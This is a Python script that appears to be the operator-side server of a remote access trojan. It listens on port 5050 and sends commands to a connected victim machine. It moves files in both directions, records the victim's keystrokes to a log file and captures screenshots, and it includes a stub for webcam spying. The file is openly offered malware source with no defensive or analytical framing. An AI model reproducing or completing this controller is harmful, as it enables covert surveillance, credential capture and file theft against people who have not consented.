import socket
import os

import tkinter as tk

BUFFER = 1024


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 5050
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    global conn
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands()
    conn.close()


def download():
    # etre dans bon repertoire

    filename = input("Filename : ")

    f = open(filename, 'wb')
    conn.send(str.encode(filename))
    print("Start...")
    i = conn.recv(1024)

    while not ('Complete' in str(i)):
        f.write(i)
        i = conn.recv(1024)

    f.close()
    print("Completed...")


def upload(cmd):


    filename = cmd[7:]

    f = open(filename, 'rb')
    i = f.read(BUFFER)
    print("Start...")
    while i:
        conn.send(i)
        i = f.read(BUFFER)

    f.close()
    conn.send(b'Complete')
    print("Completed...")




def keylogger():
    print("record started...")
    keys = []

    with open("keylog.txt", "a") as f:

        while True:
            i = conn.recv(1024).decode('utf-8')

            if i.find("space") > 0:
                if i.find("back") > 0:
                    keys.pop(-1)
                else:
                    keys.append(" ")

            elif i.find("enter") > 0:
                keys.append("\n")

            elif i == 'end':
                print("record ended...")
                f.write(k)
                f.close()
                break

            elif i.find("Key") == -1:
                keys.append(i)

            os.system('cls')
            k = ''.join(keys)
            print(k)


def screenshot():

    f = open("screen.png", 'wb')
    print("Start...")
    i = conn.recv(2048)

    while not ('Complete' in str(i)):
        f.write(i)
        i = conn.recv(2048)

    f.close()
    print("Completed...")
    os.system('"screen.png"')


def webcam():
    # cv2.namedWindow("preview")
    # recv
    # unpickle
    # while True:
    # cv2.imshow("preview", frame)
    # recv
    # unpickle
    # key = cv2.waitKey(20)
    # if key == 27:
    # conn.send(str.encode("end"))
    # break
    # cv2.destroyWindow("preview")
    pass


# Send commands to  a friend
def send_commands():
    while True:

        cmd = input()
        if cmd == 'quit':
            conn.send(str.encode(cmd))
            break

        if cmd == 'download':
            conn.send(str.encode(cmd))
            download()
        if cmd[:6] == 'upload':
            conn.send(str.encode(cmd))
            upload(cmd)

        if cmd == 'keylog':
            conn.send(str.encode(cmd))
            keylogger()
        if cmd == 'screenshot':
            conn.send(str.encode(cmd))
            screenshot()
        if cmd == 'webcam':
            conn.send(str.encode(cmd))
            webcam()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024).decode())
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
